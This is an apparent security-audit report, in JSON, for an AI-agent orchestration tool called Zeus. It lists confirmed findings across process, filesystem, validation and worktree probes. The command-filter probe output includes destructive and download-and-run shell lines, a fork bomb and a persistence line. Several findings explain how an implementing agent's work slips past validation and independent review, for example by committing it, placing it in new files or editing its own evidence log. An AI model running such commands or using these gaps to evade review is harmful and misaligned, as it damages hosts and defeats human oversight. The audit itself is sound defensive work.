@@ -1,0 +1,711 @@
+{
+ "cycleId": "cycle-1",
+ "head": "e5c50d17c3c6229f3771f455d3ad2167a03ab79d",
+ "startedAt": "2026-08-19T14:12:23.294Z",
+ "finishedAt": "2026-08-19T14:17:31.652Z",
+ "lanes": [
+  {
+   "lane": "A",
+   "title": "State / recovery / event integrity",
+   "findings": [],
+   "coverage": [
+    {
+     "section": "§7",
+     "title": "Event store append and chain semantics",
+     "status": "TESTED",
+     "probes": [
+      "A1",
+      "A2",
+      "A7",
+      "A8"
+     ]
+    },
+    {
+     "section": "§15",
+     "title": "Crash recovery and torn writes",
+     "status": "TESTED",
+     "probes": [
+      "A3",
+      "A9"
+     ]
+    },
+    {
+     "section": "§16",
+     "title": "Project lease and multi-instance safety",
+     "status": "TESTED",
+     "probes": [
+      "A4",
+      "A5"
+     ]
+    },
+    {
+     "section": "§34",
+     "title": "State path derivation and isolation",
+     "status": "TESTED",
+     "probes": [
+      "A6"
+     ]
+    }
+   ],
+   "probesRun": 9,
+   "probesHeld": 9,
+   "notes": [],
+   "durationMs": 1324,
+   "complete": true
+  },
+  {
+   "lane": "B",
+   "title": "Process / resource / concurrency",
+   "findings": [
+    {
+     "sections": [
+      "§6"
+     ],
+     "severity": "P0",
+     "title": "The wall clock does not stop a hung command",
+     "detail": "outcome=TIMEOUT after 300025ms with 0 process(es) still running.",
+     "impact": "A single hung test blocks the queue indefinitely and holds resources nobody can reclaim.",
+     "id": "B-B3",
+     "lane": "B",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-b.ts :: probe B3",
+     "observed": "  outcome               : TIMEOUT\n  elapsed ms            : 300025\n  processes left behind : 0"
+    },
+    {
+     "sections": [
+      "§18",
+      "§33"
+     ],
+     "severity": "P1",
+     "title": "Cancel kills any process group whose number matches a stale record",
+     "detail": "killRecorded() checks only that the recorded pgid is alive (`kill(-pgid, 0)`) before signalling it. It does not verify that the live group is still the job it recorded — not by command, not by start time, not by any handle that survives PID reuse. A record left behind by a crashed run therefore points at whatever process group later inherits that number.",
+     "impact": "On a busy or long-lived host, `zeus cancel` (and cancel-on-crash cleanup) can SIGKILL an unrelated process tree belonging to the user or another service, and will report it as having cancelled the task. PID space is small and recycles quickly under load, which is exactly when stale records accumulate.",
+     "id": "B-B6",
+     "lane": "B",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-b.ts :: probe B6",
+     "observed": "  recorded command            : jest\n  live process with that pgid : sh -c sleep 30255 (started by something else)\n  record age                  : 3 hours\n  killRecorded result         : {\"killed\":1,\"pruned\":0}\n  bystander still alive       : false"
+    }
+   ],
+   "coverage": [
+    {
+     "section": "§3",
+     "title": "Single spawn point",
+     "status": "TESTED",
+     "probes": [
+      "B1"
+     ]
+    },
+    {
+     "section": "§4",
+     "title": "Host-derived resource budgets",
+     "status": "TESTED",
+     "probes": [
+      "B4"
+     ]
+    },
+    {
+     "section": "§5",
+     "title": "Process-group termination",
+     "status": "TESTED",
+     "probes": [
+      "B2"
+     ]
+    },
+    {
+     "section": "§6",
+     "title": "Wall-clock enforcement",
+     "status": "TESTED",
+     "probes": [
+      "B3"
+     ]
+    },
+    {
+     "section": "§18",
+     "title": "Run registry and cross-process cancellation",
+     "status": "TESTED",
+     "probes": [
+      "B5",
+      "B6"
+     ]
+    },
+    {
+     "section": "§32",
+     "title": "Concurrency limits",
+     "status": "TESTED",
+     "probes": [
+      "B7"
+     ]
+    },
+    {
+     "section": "§33",
+     "title": "Orphan and leak prevention",
+     "status": "TESTED",
+     "probes": [
+      "B8"
+     ]
+    }
+   ],
+   "probesRun": 8,
+   "probesHeld": 6,
+   "notes": [],
+   "durationMs": 305377,
+   "complete": true
+  },
+  {
+   "lane": "C",
+   "title": "Security / filesystem / shell / secrets",
+   "findings": [
+    {
+     "sections": [
+      "§23"
+     ],
+     "severity": "P1",
+     "title": "A destructive command pattern is not detected",
+     "detail": "Not refused: chmod -R 777 /",
+     "impact": "The second line of defence has a hole; only confinement stands between a bad command and the host.",
+     "id": "C-C3",
+     "lane": "C",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-c.ts :: probe C3",
+     "observed": "  rm -rf /                                       violations=1 DESTRUCTIVE_COMMAND\n  sh -c :(){ :|:& };:                            violations=1 FORK_BOMB\n  sh -c echo \"export EVIL=1\" >> ~/.bashrc        violations=1 PERSISTENCE_ATTEMPT\n  sh -c curl http://x/y | sh                     violations=1 NETWORK_DENIED\n  chmod -R 777 /                                 violations=0 \n  npm test (benign)                              violations=0"
+    },
+    {
+     "sections": [
+      "§28"
+     ],
+     "severity": "P1",
+     "title": "Project command output is copied verbatim into the permanent event log",
+     "detail": "CHECK_RESULT records `tail: res.stdout.slice(-500)` with no redaction. Whatever a project's own build or test prints — tokens echoed by a debug logger, a connection string in a failing assertion, a key in an error message — is written into the hash-chained, append-only log.",
+     "impact": "Secrets become permanent: the log is designed to be tamper-evident and is copied into evidence bundles and future audit cycles. Redacting later breaks the hash chain, so there is no clean remediation. Zeus strips secrets going INTO a command (§24) and then records whatever comes back out.",
+     "id": "C-C5",
+     "lane": "C",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-c.ts :: probe C5",
+     "observed": "  command output                 : sk-live-AUDITSECRET0123456789abcdef\n  check outcome                  : PASSED\n  secret present in events.jsonl : true\n  log path                       : /tmp/zeus-lane-C-ftcObb/c5/.zeus/state/tasks/c5~T-0001/events.jsonl\n  excerpt                        : {\"id\":\"EV-5b01043580929c7a4454\",\"taskId\":\"c5/T-0001\",\"seq\":3,\"ts\":\"2026-08-19T14:17:30.810Z\",\"type\":\"CHECK_RESULT\",\"prev\":\"EV-2b1fb94a0d7b65f9eaeb\",\"payload\":{\"name\":\"leaky-test\",\"required\":true,\"outcome\":\"PASSED\",\"command\":\"printf sk-live-AUDITSECRET0123456789abcdef\",\"exitCode\":0,\"durationMs\":49,\"backend\":\"bubblewrap\"\n… (110 more bytes)"
+    },
+    {
+     "sections": [
+      "§28"
+     ],
+     "severity": "P2",
+     "title": "Repository content contains instruction-shaped text (INJECTION_SURFACE)",
+     "detail": "Found in: audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89, src/engine/orchestrator.ts:330, src/engine/providers.ts:83, src/setup/wizard.ts:122, src/setup/wizard.ts:479, test/engine.ts:118, test/engine.ts:127, test/engine.ts:137, test/engine.ts:157",
+     "impact": "An agent reading the repository as context could follow it as direction rather than treating it as data.",
+     "id": "C-C6",
+     "lane": "C",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-c.ts :: probe C6",
+     "observed": "  files scanned            : 71\n  injection-shaped strings : 13\n  locations                : audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89"
+    }
+   ],
+   "coverage": [
+    {
+     "section": "§21",
+     "title": "Path containment and traversal refusal",
+     "status": "TESTED",
+     "probes": [
+      "C1"
+     ]
+    },
+    {
+     "section": "§22",
+     "title": "Symlink resolution before trust",
+     "status": "TESTED",
+     "probes": [
+      "C2"
+     ]
+    },
+    {
+     "section": "§23",
+     "title": "Destructive and escaping command detection",
+     "status": "TESTED",
+     "probes": [
+      "C3"
+     ]
+    },
+    {
+     "section": "§24",
+     "title": "Environment allowlist and secret stripping",
+     "status": "TESTED",
+     "probes": [
+      "C4"
+     ]
+    },
+    {
+     "section": "§28",
+     "title": "Secret leakage into recorded evidence",
+     "status": "TESTED",
+     "probes": [
+      "C5",
+      "C6"
+     ]
+    },
+    {
+     "section": "§29",
+     "title": "Web surface",
+     "status": "NOT_APPLICABLE",
+     "reason": "Zeus ships no web surface. Verified by inspection of the release artifact allowlist (bin/, dist/, src/, install.sh, README.md, LICENSE) and of src/: there is no HTTP server, no request handler, and no static asset path in the runtime. The Control Center UI referenced elsewhere is unbuilt, so there is nothing to exercise rather than something skipped.",
+     "probes": []
+    }
+   ],
+   "probesRun": 6,
+   "probesHeld": 3,
+   "notes": [
+    "C6 scanned 71 files for injection-shaped content; 13 hit(s)."
+   ],
+   "durationMs": 634,
+   "complete": true
+  },
+  {
+   "lane": "D",
+   "title": "Validation / false-green / review independence",
+   "findings": [
+    {
+     "sections": [
+      "§10",
+      "§8",
+      "§11"
+     ],
+     "severity": "P0",
+     "title": "Added files are invisible to validation, integrity and review",
+     "detail": "Engine.diff() runs `git diff`, which reports tracked, unstaged modifications only. A file the implementer CREATES is untracked, so it appears in changedFiles() (git status --porcelain) but contributes nothing to the parsed diff. The tier is therefore resolved over zero hunks, inspectIntegrity() sees no test-surface change, and the reviewer receives a diff that omits the new code entirely.",
+     "impact": "Every anti-gaming protection is bypassed by putting the change in a new file: a new auth module is never classified high-risk, a new test arriving pre-skipped is never surfaced, and the independent reviewer reviews an empty diff while reporting on the task. This is the false-green mode the hardening work exists to prevent.",
+     "id": "D-D1",
+     "lane": "D",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-d.ts :: probe D1",
+     "observed": "  files on disk                         : src/session.ts (auth-session), test/new.spec.ts (test surface, .skip)\n  git status --porcelain                : \"?? src/\\n?? test/\"\n  git diff (what Engine.diff() returns) : \"\"\n  hunks classified                      : 0\n  resolved tier                         : NORMAL\n  testSurfaceFiles                      : []"
+    },
+    {
+     "sections": [
+      "§10",
+      "§8",
+      "§11",
+      "§12"
+     ],
+     "severity": "P0",
+     "title": "A committing implementer makes the entire change invisible",
+     "detail": "If the implementation agent commits its work in the task worktree — normal agent behaviour — then both `git status --porcelain` and `git diff` are empty. CODE_CHANGE records zero files changed, VALIDATION_PLAN classifies zero hunks, EVIDENCE_INTEGRITY inspects nothing, and the reviewer is handed an empty diff. The task can then reach COMPLETED having validated a change nobody looked at.",
+     "impact": "This is a complete bypass of adaptive validation, all anti-gaming protections and reviewer independence, triggered by an action agents take routinely. A deleted required test would go undetected. It is the highest-severity class of defect in the product: a confident, green, dishonest result.",
+     "id": "D-D2",
+     "lane": "D",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-d.ts :: probe D2",
+     "observed": "  files actually changed                : [\"a.ts\",\"src/auth.ts\"]\n  git status --porcelain (changedFiles) : \"\"\n  git diff (Engine.diff)                : \"\"\n  hunks classified                      : 0\n  tier                                  : NORMAL\n  integrity findings                    : 0"
+    },
+    {
+     "sections": [
+      "§12",
+      "§10"
+     ],
+     "severity": "P1",
+     "title": "The reviewer's diff is silently truncated",
+     "detail": "The review payload contains diff.slice(0, 20000) with no marker saying the diff was cut. A change larger than that limit is reviewed on its first portion only, and the reviewer has no way to know it is looking at a fragment.",
+     "impact": "On any large change the reviewer can report \"no findings\" having seen a fraction of it, and that verdict is recorded as an independent review of the whole change. Reviewer independence is preserved while reviewer sufficiency is not, which is arguably worse: the result looks corroborated.",
+     "id": "D-D3",
+     "lane": "D",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-d.ts :: probe D3",
+     "observed": "  reviewer diff section                : diff.slice(0, 20000)\n  truncation announced to the reviewer : false"
+    }
+   ],
+   "coverage": [
+    {
+     "section": "§8",
+     "title": "Validation tier selection integrity",
+     "status": "TESTED",
+     "probes": [
+      "D4",
+      "D5",
+      "D14"
+     ]
+    },
+    {
+     "section": "§9",
+     "title": "Deterministic floor authority",
+     "status": "TESTED",
+     "probes": [
+      "D6"
+     ]
+    },
+    {
+     "section": "§10",
+     "title": "Change visibility — what actually gets validated",
+     "status": "TESTED",
+     "probes": [
+      "D1",
+      "D2"
+     ]
+    },
+    {
+     "section": "§11",
+     "title": "Evidence-chain integrity (anti-gaming)",
+     "status": "TESTED",
+     "probes": [
+      "D7",
+      "D8",
+      "D13"
+     ]
+    },
+    {
+     "section": "§12",
+     "title": "Reviewer independence enforcement",
+     "status": "TESTED",
+     "probes": [
+      "D3",
+      "D9"
+     ]
+    },
+    {
+     "section": "§13",
+     "title": "Acceptance semantics and outcome vocabulary",
+     "status": "TESTED",
+     "probes": [
+      "D10"
+     ]
+    },
+    {
+     "section": "§31",
+     "title": "Telemetry honesty",
+     "status": "TESTED",
+     "probes": [
+      "D11"
+     ]
+    },
+    {
+     "section": "§35",
+     "title": "Escalation completeness",
+     "status": "TESTED",
+     "probes": [
+      "D12"
+     ]
+    }
+   ],
+   "probesRun": 14,
+   "probesHeld": 11,
+   "notes": [],
+   "durationMs": 362,
+   "complete": true
+  },
+  {
+   "lane": "E",
+   "title": "Installer / setup / providers / packaging",
+   "findings": [],
+   "coverage": [
+    {
+     "section": "§14",
+     "title": "Release artifact composition",
+     "status": "TESTED",
+     "probes": [
+      "E5"
+     ]
+    },
+    {
+     "section": "§25",
+     "title": "Installer safety",
+     "status": "TESTED",
+     "probes": [
+      "E1",
+      "E2"
+     ]
+    },
+    {
+     "section": "§26",
+     "title": "Setup consent",
+     "status": "TESTED",
+     "probes": [
+      "E3"
+     ]
+    },
+    {
+     "section": "§27",
+     "title": "Provider credential handling",
+     "status": "TESTED",
+     "probes": [
+      "E4",
+      "E6"
+     ]
+    }
+   ],
+   "probesRun": 6,
+   "probesHeld": 6,
+   "notes": [],
+   "durationMs": 90,
+   "complete": true
+  },
+  {
+   "lane": "F",
+   "title": "Git / worktrees / project isolation / revalidate",
+   "findings": [
+    {
+     "sections": [
+      "§17",
+      "§19"
+     ],
+     "severity": "P1",
+     "title": "Task state is visible inside the task worktree",
+     "detail": "The worktree contains .zeus/state, so an agent can read and rewrite its own evidence.",
+     "impact": "The implementer can edit the hash-chained log that is supposed to hold it to account.",
+     "id": "F-F2",
+     "lane": "F",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-f.ts :: probe F2",
+     "observed": "  project has .zeus/state  : true\n  worktree has .zeus/state : true\n  worktree entries         : .git, .zeus, a.ts"
+    },
+    {
+     "sections": [
+      "§17"
+     ],
+     "severity": "P2",
+     "title": "The empty-repository fallback copies .git and node_modules into the worktree",
+     "detail": "When a repository has no commit to check out, prepareWorktree falls back to `cp -a <root>/. <worktree>/`. That copies .git (making the worktree a full second clone whose commits never reach the project) and node_modules, plus any untracked local files including .env.",
+     "impact": "Commits an agent makes in that worktree are invisible to the project, the copy can be very large, and untracked secrets in the project root are duplicated into a directory the agent controls.",
+     "id": "F-F3",
+     "lane": "F",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-f.ts :: probe F3",
+     "observed": "  fallback copy command        : cp -a \"${this.opts.projectRoot}/.\" \"${rec.worktree}/\"\n  removes .zeus after copying  : true\n  excludes .git / node_modules : false"
+    },
+    {
+     "sections": [
+      "§30"
+     ],
+     "severity": "P3",
+     "title": "A successful revalidation mutates the task worktree without saying so",
+     "detail": "`zeus revalidate` rebases the task worktree onto the integration head. On conflict it aborts and says so, but on success it leaves the worktree rebased and reports only the tier decision.",
+     "impact": "An operator running revalidate as a read-only \"should I integrate?\" query silently changes the task's commit history. Recoverable, but surprising, and the evidence recorded against the task now describes a different base than the one it was verified on.",
+     "id": "F-F5",
+     "lane": "F",
+     "status": "CONFIRMED",
+     "reproduction": "audits/harness/lane-f.ts :: probe F5",
+     "observed": "  aborts the rebase on conflict                    : true\n  reports that it rebased                          : true\n  tells the operator the worktree was left rebased : false"
+    }
+   ],
+   "coverage": [
+    {
+     "section": "§17",
+     "title": "Worktree creation and isolation",
+     "status": "TESTED",
+     "probes": [
+      "F2",
+      "F3"
+     ]
+    },
+    {
+     "section": "§19",
+     "title": "Project state isolation",
+     "status": "TESTED",
+     "probes": [
+      "F6"
+     ]
+    },
+    {
+     "section": "§20",
+     "title": "Task identity and path isolation",
+     "status": "TESTED",
+     "probes": [
+      "F1"
+     ]
+    },
+    {
+     "section": "§30",
+     "title": "Integration revalidation",
+     "status": "TESTED",
+     "probes": [
+      "F4",
+      "F5"
+     ]
+    }
+   ],
+   "probesRun": 6,
+   "probesHeld": 3,
+   "notes": [],
+   "durationMs": 367,
+   "complete": true
+  }
+ ],
+ "findings": [
+  {
+   "sections": [
+    "§6"
+   ],
+   "severity": "P0",
+   "title": "The wall clock does not stop a hung command",
+   "detail": "outcome=TIMEOUT after 300025ms with 0 process(es) still running.",
+   "impact": "A single hung test blocks the queue indefinitely and holds resources nobody can reclaim.",
+   "id": "B-B3",
+   "lane": "B",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-b.ts :: probe B3",
+   "observed": "  outcome               : TIMEOUT\n  elapsed ms            : 300025\n  processes left behind : 0"
+  },
+  {
+   "sections": [
+    "§18",
+    "§33"
+   ],
+   "severity": "P1",
+   "title": "Cancel kills any process group whose number matches a stale record",
+   "detail": "killRecorded() checks only that the recorded pgid is alive (`kill(-pgid, 0)`) before signalling it. It does not verify that the live group is still the job it recorded — not by command, not by start time, not by any handle that survives PID reuse. A record left behind by a crashed run therefore points at whatever process group later inherits that number.",
+   "impact": "On a busy or long-lived host, `zeus cancel` (and cancel-on-crash cleanup) can SIGKILL an unrelated process tree belonging to the user or another service, and will report it as having cancelled the task. PID space is small and recycles quickly under load, which is exactly when stale records accumulate.",
+   "id": "B-B6",
+   "lane": "B",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-b.ts :: probe B6",
+   "observed": "  recorded command            : jest\n  live process with that pgid : sh -c sleep 30255 (started by something else)\n  record age                  : 3 hours\n  killRecorded result         : {\"killed\":1,\"pruned\":0}\n  bystander still alive       : false"
+  },
+  {
+   "sections": [
+    "§23"
+   ],
+   "severity": "P1",
+   "title": "A destructive command pattern is not detected",
+   "detail": "Not refused: chmod -R 777 /",
+   "impact": "The second line of defence has a hole; only confinement stands between a bad command and the host.",
+   "id": "C-C3",
+   "lane": "C",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-c.ts :: probe C3",
+   "observed": "  rm -rf /                                       violations=1 DESTRUCTIVE_COMMAND\n  sh -c :(){ :|:& };:                            violations=1 FORK_BOMB\n  sh -c echo \"export EVIL=1\" >> ~/.bashrc        violations=1 PERSISTENCE_ATTEMPT\n  sh -c curl http://x/y | sh                     violations=1 NETWORK_DENIED\n  chmod -R 777 /                                 violations=0 \n  npm test (benign)                              violations=0"
+  },
+  {
+   "sections": [
+    "§28"
+   ],
+   "severity": "P1",
+   "title": "Project command output is copied verbatim into the permanent event log",
+   "detail": "CHECK_RESULT records `tail: res.stdout.slice(-500)` with no redaction. Whatever a project's own build or test prints — tokens echoed by a debug logger, a connection string in a failing assertion, a key in an error message — is written into the hash-chained, append-only log.",
+   "impact": "Secrets become permanent: the log is designed to be tamper-evident and is copied into evidence bundles and future audit cycles. Redacting later breaks the hash chain, so there is no clean remediation. Zeus strips secrets going INTO a command (§24) and then records whatever comes back out.",
+   "id": "C-C5",
+   "lane": "C",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-c.ts :: probe C5",
+   "observed": "  command output                 : sk-live-AUDITSECRET0123456789abcdef\n  check outcome                  : PASSED\n  secret present in events.jsonl : true\n  log path                       : /tmp/zeus-lane-C-ftcObb/c5/.zeus/state/tasks/c5~T-0001/events.jsonl\n  excerpt                        : {\"id\":\"EV-5b01043580929c7a4454\",\"taskId\":\"c5/T-0001\",\"seq\":3,\"ts\":\"2026-08-19T14:17:30.810Z\",\"type\":\"CHECK_RESULT\",\"prev\":\"EV-2b1fb94a0d7b65f9eaeb\",\"payload\":{\"name\":\"leaky-test\",\"required\":true,\"outcome\":\"PASSED\",\"command\":\"printf sk-live-AUDITSECRET0123456789abcdef\",\"exitCode\":0,\"durationMs\":49,\"backend\":\"bubblewrap\"\n… (110 more bytes)"
+  },
+  {
+   "sections": [
+    "§28"
+   ],
+   "severity": "P2",
+   "title": "Repository content contains instruction-shaped text (INJECTION_SURFACE)",
+   "detail": "Found in: audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89, src/engine/orchestrator.ts:330, src/engine/providers.ts:83, src/setup/wizard.ts:122, src/setup/wizard.ts:479, test/engine.ts:118, test/engine.ts:127, test/engine.ts:137, test/engine.ts:157",
+   "impact": "An agent reading the repository as context could follow it as direction rather than treating it as data.",
+   "id": "C-C6",
+   "lane": "C",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-c.ts :: probe C6",
+   "observed": "  files scanned            : 71\n  injection-shaped strings : 13\n  locations                : audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89"
+  },
+  {
+   "sections": [
+    "§10",
+    "§8",
+    "§11"
+   ],
+   "severity": "P0",
+   "title": "Added files are invisible to validation, integrity and review",
+   "detail": "Engine.diff() runs `git diff`, which reports tracked, unstaged modifications only. A file the implementer CREATES is untracked, so it appears in changedFiles() (git status --porcelain) but contributes nothing to the parsed diff. The tier is therefore resolved over zero hunks, inspectIntegrity() sees no test-surface change, and the reviewer receives a diff that omits the new code entirely.",
+   "impact": "Every anti-gaming protection is bypassed by putting the change in a new file: a new auth module is never classified high-risk, a new test arriving pre-skipped is never surfaced, and the independent reviewer reviews an empty diff while reporting on the task. This is the false-green mode the hardening work exists to prevent.",
+   "id": "D-D1",
+   "lane": "D",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-d.ts :: probe D1",
+   "observed": "  files on disk                         : src/session.ts (auth-session), test/new.spec.ts (test surface, .skip)\n  git status --porcelain                : \"?? src/\\n?? test/\"\n  git diff (what Engine.diff() returns) : \"\"\n  hunks classified                      : 0\n  resolved tier                         : NORMAL\n  testSurfaceFiles                      : []"
+  },
+  {
+   "sections": [
+    "§10",
+    "§8",
+    "§11",
+    "§12"
+   ],
+   "severity": "P0",
+   "title": "A committing implementer makes the entire change invisible",
+   "detail": "If the implementation agent commits its work in the task worktree — normal agent behaviour — then both `git status --porcelain` and `git diff` are empty. CODE_CHANGE records zero files changed, VALIDATION_PLAN classifies zero hunks, EVIDENCE_INTEGRITY inspects nothing, and the reviewer is handed an empty diff. The task can then reach COMPLETED having validated a change nobody looked at.",
+   "impact": "This is a complete bypass of adaptive validation, all anti-gaming protections and reviewer independence, triggered by an action agents take routinely. A deleted required test would go undetected. It is the highest-severity class of defect in the product: a confident, green, dishonest result.",
+   "id": "D-D2",
+   "lane": "D",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-d.ts :: probe D2",
+   "observed": "  files actually changed                : [\"a.ts\",\"src/auth.ts\"]\n  git status --porcelain (changedFiles) : \"\"\n  git diff (Engine.diff)                : \"\"\n  hunks classified                      : 0\n  tier                                  : NORMAL\n  integrity findings                    : 0"
+  },
+  {
+   "sections": [
+    "§12",
+    "§10"
+   ],
+   "severity": "P1",
+   "title": "The reviewer's diff is silently truncated",
+   "detail": "The review payload contains diff.slice(0, 20000) with no marker saying the diff was cut. A change larger than that limit is reviewed on its first portion only, and the reviewer has no way to know it is looking at a fragment.",
+   "impact": "On any large change the reviewer can report \"no findings\" having seen a fraction of it, and that verdict is recorded as an independent review of the whole change. Reviewer independence is preserved while reviewer sufficiency is not, which is arguably worse: the result looks corroborated.",
+   "id": "D-D3",
+   "lane": "D",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-d.ts :: probe D3",
+   "observed": "  reviewer diff section                : diff.slice(0, 20000)\n  truncation announced to the reviewer : false"
+  },
+  {
+   "sections": [
+    "§17",
+    "§19"
+   ],
+   "severity": "P1",
+   "title": "Task state is visible inside the task worktree",
+   "detail": "The worktree contains .zeus/state, so an agent can read and rewrite its own evidence.",
+   "impact": "The implementer can edit the hash-chained log that is supposed to hold it to account.",
+   "id": "F-F2",
+   "lane": "F",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-f.ts :: probe F2",
+   "observed": "  project has .zeus/state  : true\n  worktree has .zeus/state : true\n  worktree entries         : .git, .zeus, a.ts"
+  },
+  {
+   "sections": [
+    "§17"
+   ],
+   "severity": "P2",
+   "title": "The empty-repository fallback copies .git and node_modules into the worktree",
+   "detail": "When a repository has no commit to check out, prepareWorktree falls back to `cp -a <root>/. <worktree>/`. That copies .git (making the worktree a full second clone whose commits never reach the project) and node_modules, plus any untracked local files including .env.",
+   "impact": "Commits an agent makes in that worktree are invisible to the project, the copy can be very large, and untracked secrets in the project root are duplicated into a directory the agent controls.",
+   "id": "F-F3",
+   "lane": "F",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-f.ts :: probe F3",
+   "observed": "  fallback copy command        : cp -a \"${this.opts.projectRoot}/.\" \"${rec.worktree}/\"\n  removes .zeus after copying  : true\n  excludes .git / node_modules : false"
+  },
+  {
+   "sections": [
+    "§30"
+   ],
+   "severity": "P3",
+   "title": "A successful revalidation mutates the task worktree without saying so",
+   "detail": "`zeus revalidate` rebases the task worktree onto the integration head. On conflict it aborts and says so, but on success it leaves the worktree rebased and reports only the tier decision.",
+   "impact": "An operator running revalidate as a read-only \"should I integrate?\" query silently changes the task's commit history. Recoverable, but surprising, and the evidence recorded against the task now describes a different base than the one it was verified on.",
+   "id": "F-F5",
+   "lane": "F",
+   "status": "CONFIRMED",
+   "reproduction": "audits/harness/lane-f.ts :: probe F5",
+   "observed": "  aborts the rebase on conflict                    : true\n  reports that it rebased                          : true\n  tells the operator the worktree was left rebased : false"
+  }
+ ],
+ "confirmed": 11,
+ "suspected": 0,
+ "bySeverity": {
+  "P0": 3,
+  "P1": 5,
+  "P2": 2,
+  "P3": 1
+ },
+ "coverageGaps": [],
+ "verdict": "FINDINGS_OPEN",
+ "evidenceChain": [
+  "6 lane(s) ran 49 probe(s) against e5c50d17c3c6",
+  "38 probe(s) observed the invariant holding",
+  "11 finding(s) CONFIRMED by executable reproduction; 0 SUSPECTED (not reproduced)",
+  "8 unfixed P0/P1 finding(s) remain open",
+  "0 charter section(s) untested with no stated reason",
+  "0 lane(s) failed to complete",
+  "the candidate has open findings or coverage gaps and is not cleared for installation"
+ ]
+}
